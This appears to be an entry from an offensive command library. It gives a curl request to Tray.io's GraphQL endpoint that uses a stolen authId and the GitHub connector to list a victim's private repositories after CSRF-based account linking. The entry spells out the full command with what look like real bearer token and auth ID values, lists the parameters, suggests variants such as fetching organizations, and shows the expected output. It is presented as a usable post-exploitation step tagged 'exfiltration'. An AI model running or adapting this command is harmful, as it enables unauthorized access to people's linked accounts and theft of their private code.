---
data: >-
  curl -X POST https://tray.io/graphql -H "Authorization: Bearer
  aad14176400b44bb97b703b4ae1077a5c84c3b7f97e34f5383643c1c8a22cdf4" -H
  "Content-Type: application/json" -d
  '{"operationName":"CallConnector","variables":{"input":{"connector":"github","version":"2.2","operation":"raw_http_request","authId":"22583997-4aa0-4bb8-87cb-28326dc97868","input":{"method":"GET","url":{"endpoint":"/user/repos?per_page=50&page=1&affiliation=owner%2Ccollaborator%2Corganization_member"}}}},"query":"mutation
  CallConnector($input: ConnectorCallInput!) { callConnector(input: $input) {
  output __typename } }"}'
tags:
  - graphql
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.838Z'
id: d5ceaabe-ac0e-48fa-8ee8-ee3cb0e4ba50
verified: false
validated: true
submitted: true
---
# tray-io-graphql-fetch-repos

## Command

```bash
curl -X POST https://tray.io/graphql \
  -H "Authorization: Bearer aad14176400b44bb97b703b4ae1077a5c84c3b7f97e34f5383643c1c8a22cdf4" \
  -H "Content-Type: application/json" \
  -d '{"operationName":"CallConnector","variables":{"input":{"connector":"github","version":"2.2","operation":"raw_http_request","authId":"22583997-4aa0-4bb8-87cb-28326dc97868","input":{"method":"GET","url":{"endpoint":"/user/repos?per_page=50&page=1&affiliation=owner%2Ccollaborator%2Corganization_member"}}}},"query":"mutation CallConnector($input: ConnectorCallInput!) { callConnector(input: $input) { output __typename } }"}'
```

## Description

This command executes a GraphQL mutation on Tray.io to call the GitHub connector using a stolen authId, fetching the user's repositories (including private ones) via a raw HTTP GET request to GitHub's API. Used post-exploitation after CSRF-based account linking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Authorization` | Bearer token for Tray.io authentication | Yes |
| `authId` | Victim's authentication ID from linked integration | Yes |
| `endpoint` | GitHub API path, e.g., /user/repos with query params | Yes |
| `method` | HTTP method (GET) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://tray.io/graphql -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{...}'
```

### Advanced Usage

Modify endpoint for other GitHub calls, e.g., /user/orgs for organizations.

```bash
# Similar structure, change endpoint to /user/orgs
```

## Expected Output

JSON response: {"data":{"callConnector":{"output":{"repositories":[{"name":"private-repo","private":true,...}]},"__typename":"ConnectorOutput"}}}

## Related

- [[Related Procedure: Exploit-Linked-Account-via-Tray-io-GraphQL]]
